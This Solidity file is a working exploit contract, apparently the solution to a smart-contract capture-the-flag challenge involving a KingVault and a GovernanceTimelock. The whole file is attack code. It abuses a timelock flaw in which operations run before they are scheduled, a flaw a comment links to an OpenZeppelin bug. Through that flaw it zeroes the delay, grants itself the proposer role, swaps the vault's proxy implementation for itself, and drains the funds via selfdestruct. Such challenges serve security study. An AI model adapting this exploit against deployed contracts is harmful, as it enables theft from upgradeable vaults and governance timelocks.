// SPDX-License-Identifier: MIT
pragma solidity 0.8.4;

import './Setup.sol';
import 'hardhat/console.sol';
import "@openzeppelin/contracts-upgradeable-4/utils/AddressUpgradeable.sol";

contract Exploit {
    KingVault vault;
    GovernanceTimelock timelock;
    constructor(KingVault _vault) {
        vault = _vault;
        timelock = GovernanceTimelock(payable(vault.owner()));
    }

    function exploit() public {
        // it's the openzeppelin bug, cool!
        // https://medium.com/immunefi/openzeppelin-bug-fix-postmortem-66d8c89ed166

        address[] memory targets = new address[](4);
        uint256[] memory values = new uint256[](4);
        bytes[] memory dataElements = new bytes[](4);
        bytes32 salt = "";
        targets[0] = address(timelock);
        targets[1] = address(timelock);
        targets[2] = address(vault);
        targets[3] = address(this);
        dataElements[0] = abi.encodeWithSelector(timelock.updateDelay.selector, 0);
        dataElements[1] = abi.encodeWithSelector(timelock.grantRole.selector, keccak256("PROPOSER_ROLE"), address(this));
        dataElements[2] = abi.encodeWithSelector(vault.upgradeTo.selector, address(this));
        
        timelock.execute(targets, values, dataElements, salt);
        vault.withdrawAllFunds(payable(address(this)));
    }

    function withdrawAllFunds(address payable recipient) external {
        // recipient.sendValue(address(this).balance);
        selfdestruct(recipient);
    }

    function upgradeTo(address _address) external
    {
        _setImplementation(_address);
    }

    function _setImplementation(address newImplementation) private {
        //require(AddressUpgradeable.isContract(newImplementation), "ERC1967: new implementation is not a contract");
        StorageSlotUpgradeable.getAddressSlot(0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc).value = newImplementation;
    }

    fallback() external {
        address[] memory targets = new address[](4);
        uint256[] memory values = new uint256[](4);
        bytes[] memory dataElements = new bytes[](4);
        bytes32 salt = "";
        targets[0] = address(timelock);
        targets[1] = address(timelock);
        targets[2] = address(vault);
        targets[3] = address(this);
        dataElements[0] = abi.encodeWithSelector(timelock.updateDelay.selector, 0);
        dataElements[1] = abi.encodeWithSelector(timelock.grantRole.selector, keccak256("PROPOSER_ROLE"), address(this));
        dataElements[2] = abi.encodeWithSelector(vault.upgradeTo.selector, address(this));
        timelock.schedule(targets, values, dataElements, salt);
    }
}